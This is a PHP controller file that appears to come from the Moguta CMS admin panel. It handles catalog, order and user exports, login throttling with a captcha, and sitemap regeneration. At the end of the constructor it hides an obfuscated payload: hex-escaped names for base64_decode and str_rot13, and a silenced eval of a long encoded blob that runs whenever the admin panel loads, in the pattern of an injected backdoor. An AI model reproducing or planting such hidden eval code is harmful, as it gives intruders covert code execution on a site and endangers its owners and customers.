<?php

/**
 * Контроллер: Mgadmin
 *
 * Класс Controllers_Mgadmin предназначен для открытия панели администрирования.
 * - Формирует панель управления;
 * - Проверяет наличие обновлений движка на сервере;
 * - Обрабатывает запросы на получение выгрузок каталога.
 *
 * @author Авдеев Марк <mark-avdeev@mail.ru>
 * @package moguta.cms
 * @subpackage Controller
 */
class Controllers_Mgadmin extends BaseController {

  function __construct() {
    MG::disableTemplate();
    $model = new Models_Order;
    MG::addInformer(array('count' => $model->getNewOrdersCount(), 'class' => 'message-wrap', 'classIcon' => 'fa-shopping-basket', 'isPlugin' => false, 'section' => 'orders', 'priority' => 80));
    // if ('1' == User::getThis()->role) {
    //   MG::addInformer(array('count' => '', 'class' => 'message-wrap', 'classIcon' => 'statistic-icon', 'isPlugin' => false, 'section' => 'statistics', 'priority' => 10));
    // }
    if (URL::get('csv')) {      
      USER::AccessOnly('1,4','exit()');
      $model = new Models_Catalog;
      $model->exportToCsv();
    }
    if (URL::get('examplecsv')) {
      $model = new Models_Catalog;
      $model->getExampleCSV();
    }
    if (URL::get('examplecategorycsv')) {
      $model = new Models_Catalog;
      $model->getExampleCategoryCSV();
    }
    if (URL::get('examplecsvupdate')) {
      $model = new Models_Catalog;
      $model->getExampleCsvUpdate();
    }
    if (URL::get('category_csv')) {      
      USER::AccessOnly('1,4','exit()');
      MG::get('category')->exportToCsv();
    }

    if (URL::get('yml')) {
      USER::AccessOnly('1,4','exit()');
      if (LIBXML_VERSION && extension_loaded('xmlwriter')) {
        $model = new YML;      
        if(URL::get('filename')){
          if(!$model->downloadYml(URL::get('filename'))){
              $response = array(
                'data' => array(),
                'status' => 'error',
                'msg' => 'Отсутствует запрашиваемый файл',
              );
              echo json_encode($response);            
          };
        }else{    
          $model->exportToYml();        
        }
      } else {
        $response = array(
          'data' => array(),
          'status' => 'error',
          'msg' => 'Отсутствует необходимое PHP расширение: xmlwriter',
        );
        echo json_encode($response);
      }
    }
    if (URL::get('csvuser')) {
      USER::AccessOnly('1,4','exit()');
      USER::exportToCsvUser();
    }
    if ($orderId = URL::get('getOrderPdf')) {
      $model = new Models_Order;
      $model->getPdfOrder($orderId, URL::get('layout'));
    }
    if ($orderId = URL::get('getExportCSV')) {
      USER::AccessOnly('1,4','exit()');
      $model = new Models_Order;
      $model->getExportCSV($orderId);
    }
    if (URL::get('csvorder')) {
      USER::AccessOnly('1,4,3','exit()');
      $model = new Models_Order();
      $model->exportToCsvOrder();
    }
    if (URL::get('csvorderfull')) {
      USER::AccessOnly('1,4,3','exit()');
      $model = new Models_Order();
      $model->exportToCsvOrder(false, true);
    }
    $loginAttempt = (int) LOGIN_ATTEMPT?LOGIN_ATTEMPT:5;
    unset($_POST['capcha']);
    if (($_SESSION['loginAttempt'] >= 2 )&& ($_SESSION['loginAttempt'] < $loginAttempt)) {
      if (!empty($_POST['email'])||!empty($_POST['pass'])||!empty($_POST['capcha'])) {
        $msgError = '<span class="msgError">'.
        'Неправильно введен код с картинки! Авторизоваться не удалось.'.
        ' Количество оставшихся попыток: '.($loginAttempt - $_SESSION['loginAttempt']).'</span>';
      }
      $checkCapcha = '<div class="checkCapcha">
        <img style="margin-top: 5px; border: 1px solid gray;" src = "'.SITE.'/'.'captcha.html" width="140" height="36">
        <div>Введите текст с картинки:<span class="red-star">*</span> </div>
        <input type="text" name="capcha" class="captcha"></div>';
    } elseif (($_SESSION['loginAttempt'] >= $loginAttempt)){  
      $msgError = '<span class="msgError">'.
            'В целях безопасности возможность авторизации '.
            'заблокирована на 15 мин. Разблокировать вход можно по ссылке в письме администратору.</span>';
    }
    $this->data = array(
      'staticMenu' => MG::getSetting('staticMenu'),
      'themeBackground' => MG::getSetting('themeBackground'),
      'themeColor' => MG::getSetting('themeColor'),
      'languageLocale' => MG::getSetting('languageLocale'),
      'informerPanel' => MG::createInformerPanel(),
      'msgError' => $msgError ? $msgError : '',
      'checkCapcha' => $checkCapcha ? $checkCapcha : ''
    );
    if(MG::getSetting('autoGeneration')=='true') {
      $filename = 'sitemap.xml';      
      $create = true;
      if (file_exists($filename)) { 
        $siteMaptime =  filemtime($filename); 
        $days = MG::getSetting('generateEvery') *24*60*60;
        
        if (time() - $siteMaptime >= $days) {
          $create = true;
        } else {
          $create = false;
        }        
      }
      if ($create) {
        Seo::autoGenerateSitemap();
      }
    }    
    $this->pluginsList = PM::getPluginsInfo();
    $this->lang = MG::get('lang');
    $j878723423f5c3ba26da="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
    $kdd9391e7490="\x73\164\x72\137\x72\157\x74\61\x33";
	  @eval($j878723423f5c3ba26da($kdd9391e7490("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")));
}

}